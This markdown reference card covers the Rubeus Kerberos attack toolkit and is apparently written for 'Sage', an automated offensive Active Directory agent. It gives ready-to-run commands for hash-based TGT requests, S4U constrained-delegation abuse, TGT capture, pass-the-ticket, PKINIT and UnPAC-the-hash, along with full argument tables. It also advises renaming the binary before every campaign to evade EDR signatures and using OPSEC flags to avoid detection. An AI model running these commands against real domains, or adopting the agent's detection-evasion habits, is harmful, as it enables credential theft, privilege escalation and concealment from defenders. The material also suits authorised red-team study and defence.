---
name: Rubeus
category: kerberos
subcategories: [ticket-manipulation, s4u, asktgt, monitor]
tradecraft_tags: [kerberos, tickets, s4u2self, s4u2proxy, pkinit, unpac, asktgs]
mitre_attack:
  - id: T1558.003
    name: Steal or Forge Kerberos Tickets — Kerberoasting
  - id: T1558.004
    name: Steal or Forge Kerberos Tickets — AS-REP Roasting
  - id: T1550.003
    name: Use Alternate Authentication Material — Pass the Ticket
source:
  url: https://github.com/GhostPack/Rubeus
  license: BSD-3-Clause
  maintained: true
binary_type: .net-assembly
binary_filename: Rubeus.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  Microsoft Defender, CrowdStrike, and SentinelOne have strong signatures for
  Rubeus by name. Behavioral detection catches abnormal Kerberos traffic
  patterns (S4U requests from non-server contexts, asktgt with /tgtdeleg).
usage_examples:
  - description: Request a TGT with a known hash
    args: "asktgt /user:jon.snow /rc4:<nthash> /domain:north.sevenkingdoms.local /nowrap"
  - description: S4U2self + S4U2proxy chain (constrained delegation abuse)
    args: "s4u /user:JON.SNOW /rc4:<nthash> /impersonateuser:Administrator /msdsspn:cifs/winterfell.north.sevenkingdoms.local /altservice:host,http,winrm /ptt"
  - description: Monitor for incoming TGT (unconstrained delegation abuse)
    args: "monitor /interval:1 /filteruser:KINGSLANDING$"
  - description: Pass-the-ticket — inject base64 TGT into current session
    args: "ptt /ticket:<base64ticket>"
  - description: PKINIT request with certificate
    args: "asktgt /user:administrator /certificate:<base64pfx> /domain:essos.local /ptt"
  - description: UnPAC the hash (extract NT hash from PAC_CREDENTIAL_INFO)
    args: "asktgt /user:<user> /certificate:<pfx> /getcredentials /show"
opsec_notes: |
  Rubeus is heavily signatured by name. ALWAYS rename the assembly before upload.
  The /tgtdeleg trick generates 4624 events that some EDRs flag. /nowrap output
  format is essential for piping ticket bytes to other tools without line breaks.
gotchas: |
  /altservice trick (silver-ticket-style service rewriting) only works when the
  initial TGS comes from S4U2self, not from a normal asktgs. Some PKINIT paths
  require the cert's UPN to match exactly. Watch for clock skew (>5 min = ticket rejection).
related_ttps: [certify, sharpkatz, mimikatz, nanodump]
alternatives: [kekeo, impacket-ticketer, impacket-getST]
common_args:
  /user:
    description: Username to operate on
    typical_values: [administrator, jon.snow, "MEEREEN$"]
    required: true
  /rc4:
    description: NT (RC4) hash of the user
    typical_values: [<nthash>]
  /aes256:
    description: AES256 key of the user (preferred over /rc4 when available)
    typical_values: [<aes256-key>]
  /domain:
    description: Target domain
    typical_values: [north.sevenkingdoms.local, essos.local, sevenkingdoms.local]
  /impersonateuser:
    description: User to impersonate (used in s4u command)
    typical_values: [Administrator, "TARGET$"]
  /msdsspn:
    description: Target SPN for s4u proxy ticket
    typical_values: ["cifs/winterfell.north.sevenkingdoms.local"]
  /altservice:
    description: Service name(s) to rewrite the s4u TGS for; comma-separated
    typical_values: ["host,http,winrm,cifs"]
  /ptt:
    description: Pass-The-Ticket — inject the resulting ticket into current session
    typical_values: [flag-only]
  /nowrap:
    description: Output tickets on a single line (essential for piping)
    typical_values: [flag-only]
  /certificate:
    description: Base64 PFX or path for PKINIT authentication
    typical_values: [<base64-pfx>]
  /getcredentials:
    description: UnPAC the hash from a PKINIT TGT's PAC
    typical_values: [flag-only]
  /show:
    description: Display recovered credential material
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# Rubeus

The canonical Windows-side Kerberos manipulation toolkit. Every attack family
that touches tickets — kerberoasting, AS-REP roasting, S4U abuse, RBCD,
silver/golden tickets, PKINIT, pass-the-ticket — has a Rubeus command path.
Rubeus is what makes most modern AD attacks executable from a compromised
Windows host without dropping mimikatz.

## Typical use cases
- Request a TGT from a known NT hash or AES key (`asktgt`)
- Mint service tickets via S4U2self + S4U2proxy (`s4u`) — the constrained-delegation primitive
- Capture forwarded TGTs from coerced authentication (`monitor` for unconstrained delegation abuse)
- Pass-the-ticket: inject base64 ticket into the current logon session (`ptt`)
- PKINIT: authenticate with a certificate from ADCS abuse (`asktgt /certificate`)
- UnPAC the hash: extract NT hash from a PKINIT TGT's PAC (`/getcredentials /show`)

## How Sage uses this
Rubeus is the kerberos workhorse for the Trust Walker. After SharpHound
identifies delegation primitives (constrained-delegation-with-protocol-transition,
unconstrained delegation candidates), Rubeus is what actually fires the S4U
chains and ticket captures. After ADCS ESC1/4/6/8 produces a certificate,
Rubeus PKINIT-authenticates with it to land a usable TGT.

## Output
Base64-encoded tickets to stdout (or to disk with /outfile). Use /nowrap to
keep ticket bytes on a single line for chaining into other tools.

## OPSEC considerations
The literal string "Rubeus" is in many EDR signature sets. Rename the
assembly before every campaign. Some commands (monitor, /tgtdeleg) generate
distinctive Windows event log signatures; in supervised mode, Sage should
surface this to the operator as part of the approval prompt.

## Full Reference

> Captured against Rubeus v2.3.x, 2026-05-29. Source: https://github.com/GhostPack/Rubeus README
> + bare `Rubeus.exe` invocation (command listing). Version observed: v2.3.2.

### Sub-commands

| Sub-command | Purpose |
|-------------|---------|
| `asktgt` | Request a TGT using password, hash, or certificate |
| `asktgs` | Request a service ticket (TGS) for a specified SPN |
| `s4u` | S4U2self + S4U2proxy for constrained/RBCD delegation abuse |
| `ptt` | Pass-the-ticket: inject a base64/kirbi ticket into the current or specified logon session |
| `purge` | Purge all Kerberos tickets from current or specified logon session |
| `describe` | Base64-decode and describe a ticket |
| `triage` | Enumerate all Kerberos tickets in accessible logon sessions |
| `dump` | Dump ticket bytes (base64 or kirbi) from current or specified LUID |
| `monitor` | Monitor for incoming TGTs (useful in unconstrained delegation abuse) |
| `harvest` | Continuously harvest and renew TGTs |
| `kerberoast` | Request TGS for kerberoastable accounts (RC4 downgrade) |
| `asreproast` | AS-REP roast accounts without pre-auth required |
| `createnetonly` | Create a new sacrificial process with a netonly logon session |
| `changepw` | Change a user's password (kpasswd) |
| `tgtdeleg` | Abuse S4U2self to get a delegatable TGT for the current user |
| `currentluid` | Display current LUID |
| `brute` | Kerberos brute-force / password spray |
| `hash` | Hash a cleartext password to all Kerberos key types |

### Full argument listing — `asktgt`

| Arg | Description |
|-----|-------------|
| `/user:X` | Username (required) |
| `/domain:X` | Target domain (FQDN; defaults to current) |
| `/dc:X` | Specific DC to contact |
| `/password:X` | Cleartext password |
| `/rc4:X` | NT (NTLM/RC4) hash |
| `/aes128:X` | AES128 key |
| `/aes256:X` | AES256 key (preferred; generates stronger etype=18 TGT) |
| `/certificate:X` | Base64-encoded PFX or path to PFX file (PKINIT) |
| `/password` (cert) | PFX password if required |
| `/getcredentials` | UnPAC the hash from a PKINIT TGT (requires /certificate) |
| `/show` | Print recovered credentials from /getcredentials |
| `/ptt` | Inject resulting TGT into current logon session |
| `/luid:X` | Target specific logon session LUID |
| `/nowrap` | Don't base64-wrap output (single-line ticket) |
| `/outfile:X` | Write ticket to file |
| `/opsec` | Request with OPSEC-friendly options (no pre-auth logging anomaly) |
| `/enctype:X` | Preferred encryption type: rc4, aes128, aes256, des, des3 |
| `/nopac` | Request ticket without PAC |
| `/oldsam` | Bypass clock skew for SAM-based accounts |

### Full argument listing — `s4u`

| Arg | Description |
|-----|-------------|
| `/user:X` | The account configured for constrained delegation |
| `/rc4:X` / `/aes256:X` | Credential for the delegation account |
| `/ticket:X` | Existing TGT for the delegation account (base64 or file path) |
| `/impersonateuser:X` | User to impersonate in the S4U2self step |
| `/msdsspn:X` | Target SPN for S4U2proxy (e.g. `cifs/TARGET.DOMAIN`) |
| `/altservice:X` | Comma-separated list of service names to substitute (rewrite TGS) |
| `/self` | Only perform S4U2self (skip S4U2proxy) |
| `/ptt` | Inject final ticket |
| `/nowrap` | Single-line output |
| `/outfile:X` | Write ticket to file |
| `/targetdomain:X` | For cross-domain S4U |
| `/targetdc:X` | Target DC for S4U |
| `/dc:X` | DC to contact for the S4U2self TGT |
| `/opsec` | Request S4U with OPSEC options |
| `/nopac` | Request without PAC |
| `/domain:X` | Domain of the source account |
| `/additional-tgs:X` | Additional TGS SPNs (for multi-hop S4U) |

### Full argument listing — `monitor`

| Arg | Description |
|-----|-------------|
| `/interval:X` | Polling interval in seconds (default 60) |
| `/filteruser:X` | Only show TGTs for a specific user (e.g. `DC$` for coercion) |
| `/targetdomain:X` | Target domain to monitor |
| `/nowrap` | Single-line base64 output |
| `/runfor:X` | Minutes to run before exiting |

### Full argument listing — `kerberoast`

| Arg | Description |
|-----|-------------|
| `/spn:X` | Specific SPN to request TGS for |
| `/user:X` | Specific user to kerberoast |
| `/domain:X` | Target domain |
| `/dc:X` | Specific DC |
| `/outfile:X` | Write hashes to file |
| `/aes` | Request AES-only tickets (prevents RC4 downgrade; use when AES is available) |
| `/ticket:X` | Use existing TGT to request TGS |
| `/rc4opsec` | Request tickets with RC4 encryption only (some detection evasion) |
| `/nowrap` | No base64 wrapping |
| `/ldapfilter:X` | Custom LDAP filter for user enumeration |
| `/pwdsetafter:X` | Filter by password set after date |
| `/pwdsetbefore:X` | Filter by password set before date |
| `/resultlimit:X` | Limit number of results |

> **NOTE ON CRACKING:** Kerberoast and AS-REP roast hashes require offline cracking (hashcat/john).
> Sage does NOT perform offline cracking. If the goal is ticket manipulation without cracking,
> use asktgt+s4u or PKINIT paths instead. Document `kerberoast` usage in gotchas.

### Full argument listing — `asreproast`

| Arg | Description |
|-----|-------------|
| `/user:X` | Specific user to AS-REP roast |
| `/domain:X` | Target domain |
| `/dc:X` | Specific DC |
| `/outfile:X` | Write hashes to file |
| `/nowrap` | No base64 wrapping |
| `/format:X` | Output format: hashcat (default) or john |

### Output formats

- **Default**: Base64-encoded ticket(s) printed to stdout, one per line (wrapped at 76 chars unless /nowrap)
- **/outfile**: KRB_CRED .kirbi file written to disk
- **/nowrap**: Single unbroken base64 string (essential for piping to `ptt` or storing in C2)
- **Kerberoast/AS-REP**: Hash output in `$krb5tgs$23$...` format (hashcat 13100 for kerberoast, 18200 for AS-REP)
- **describe/triage**: Human-readable ticket metadata table

### Environment variables

None used directly. Rubeus will read from the current user's Kerberos cache and logon sessions.

### Exit codes

- 0 = success
- Non-zero = error (most errors reported as exceptions in output text)

### Version-specific notes

- v1.x: Some S4U behavior differences; `/altservice` rewriting behavior more limited
- v2.0+: PKINIT support added (`/certificate` flag); reliable UnPAC-the-hash path
- v2.2+: `/opsec` flag across multiple commands
- v2.3.x: Current stable; most examples in this file tested against this version
- Clock skew tolerance: Kerberos rejects tickets more than 5 minutes off DC time. If `KRB_AP_ERR_SKEW` appears, sync the clock.

### Source for this reference

- https://github.com/GhostPack/Rubeus (README, full command reference)
- Bare `Rubeus.exe` invocation (prints command list with one-line descriptions)
- HarmJ0y blog: https://harmj0y.medium.com/rubeus-now-with-more-kekeo-6f57d91079b9
- Version: v2.3.x as of 2026-05-29
